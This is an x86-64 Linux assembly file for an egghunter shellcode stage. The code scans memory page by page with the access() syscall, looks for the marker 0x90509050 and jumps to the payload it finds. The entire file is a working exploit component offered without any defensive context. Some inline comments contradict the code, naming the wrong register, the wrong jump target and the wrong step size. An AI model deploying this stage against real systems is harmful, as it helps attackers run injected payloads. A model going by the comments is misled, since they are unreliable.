global _start

section .text

_start:
    xor rdi, rdi        ; Clear rdi
    xor rsi, rsi        ; Clear rsi

align_page:
    or di, 0xfff	      ; Page alignment operation on the current pointer and then incrementing edx by one.
			                  ; This operation is equivalent to adding 0x1000 to the value in edx
    inc rdi		          ; + 0x1000 bytes

next_addr:
    push 0x15		        ; syscall access() - 21
    pop rax
    syscall

    cmp al, 0xf2        ; check for EFAULT
    jz align_page       ; if efault happens jumps back to next_addr and trying +0x1000 bytes

    mov eax, 0x90509051 ; The egg key is 0x90509050, but its going to be set as 0x90509051 (avoid the egghunter finding itself)
    dec al		          ; Dec eax to set it as 0x90509050 (key)
    scasd

    jnz next_addr	      ; if edi and eax are different, jumps back to next_addr and trying +0x1000 bytes

    jmp rdi		          ; If rdi and rax are equal, the egg was found and the code will jump to rdi
